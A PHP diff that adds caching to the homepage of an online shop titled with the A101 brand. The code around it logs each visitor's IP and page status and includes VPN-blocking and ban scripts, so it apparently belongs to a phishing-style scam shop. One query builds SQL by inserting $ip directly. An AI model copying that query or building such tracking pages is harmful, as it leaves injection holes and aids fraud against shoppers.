@@ -1,13 +1,25 @@
 <?php 
-   include_once("config.php");
-   include_once("./txmd/Data/Server/GrabIP.php");
-   include_once("./txmd/Data/Server/BlockVPN.php");
-   include_once("./txmd/Data/Server/BanControl.php");
+include_once("config.php");
+include_once("cache.php");
+include_once("./txmd/Data/Server/GrabIP.php");
+include_once("./txmd/Data/Server/BlockVPN.php");
+include_once("./txmd/Data/Server/BanControl.php");
    $pdo->query("UPDATE logs SET durum = 'Anasayfa' WHERE ip = '{$ip}'");
-   $checkAdmin = $pdo->query("SELECT * FROM admin_settings")->fetch(PDO::FETCH_ASSOC);
-   $stmt = $pdo->query("SELECT COUNT(*) AS urun_sayisi FROM urunler");
-   $sonuc = $stmt->fetch(PDO::FETCH_ASSOC);
-   $urun_sayisi = $sonuc['urun_sayisi'];
+   // Cache'den admin ayarlarını al
+   $checkAdmin = SimpleCache::get('admin_settings');
+   if (!$checkAdmin) {
+       $checkAdmin = $pdo->query("SELECT * FROM admin_settings")->fetch(PDO::FETCH_ASSOC);
+       SimpleCache::set('admin_settings', $checkAdmin);
+   }
+   
+   // Cache'den ürün sayısını al
+   $urun_sayisi = SimpleCache::get('urun_sayisi');
+   if (!$urun_sayisi) {
+       $stmt = $pdo->query("SELECT COUNT(*) AS urun_sayisi FROM urunler");
+       $sonuc = $stmt->fetch(PDO::FETCH_ASSOC);
+       $urun_sayisi = $sonuc['urun_sayisi'];
+       SimpleCache::set('urun_sayisi', $urun_sayisi);
+   }
    
    // SEO Variables
    $page_title = "A101 HARCA HARCA BİTMEZ - Online Alışveriş";
